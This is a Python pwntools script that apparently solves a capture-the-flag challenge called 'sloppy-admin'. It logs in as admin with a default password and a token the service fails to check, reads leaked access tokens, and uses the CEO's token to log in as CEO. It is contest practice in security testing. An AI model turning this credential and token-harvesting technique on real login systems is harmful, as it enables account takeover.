#!/usr/bin/env python3
from pwn import *
import re

HOST = "sloppy-admin.challs.m0lecon.it"
PORT = 5000


def menu(p):
    p.recvuntil(b'2) Login')

def login_admin(p):
    menu(p)
    p.sendline(b'2')
    p.recvuntil(b'username:')
    p.sendline(b'admin')
    p.recvuntil(b'password:')
    p.sendline(b'adminpassword')
    p.recvuntil(b'token (hex):')
    p.sendline(b'0')  # token sai cũng được

    p.recvuntil(b"Here is all the access tokens:")
    data = p.recvuntil(b"1) Register").decode()
    return data

def parse_ceo_token(data):
    m = re.search(r"CEO: ([0-9a-fA-F]+)", data)
    if not m:
        print("[-] Không tìm thấy token CEO")
        exit(1)
    return m.group(1)

def login_ceo(p, ceo_token):
    p.sendline(b"2")
    p.recvuntil(b"username:")
    p.sendline(b"CEO")
    p.recvuntil(b"password:")
    p.sendline(b"anything")  # password sai cũng ok
    p.recvuntil(b"token (hex):")
    p.sendline(ceo_token.encode())

    return p.recvuntil(b"1) Register", timeout=2).decode(errors="ignore")


def main():
    p = remote(HOST, PORT)

    print("[*] Login admin...")
    data = login_admin(p)

    ceo_token = parse_ceo_token(data)
    print("[+] CEO token:", ceo_token)

    print("[*] Login CEO...")
    out = login_ceo(p, ceo_token)
    print(out)

    p.close()

if __name__ == "__main__":
    main()
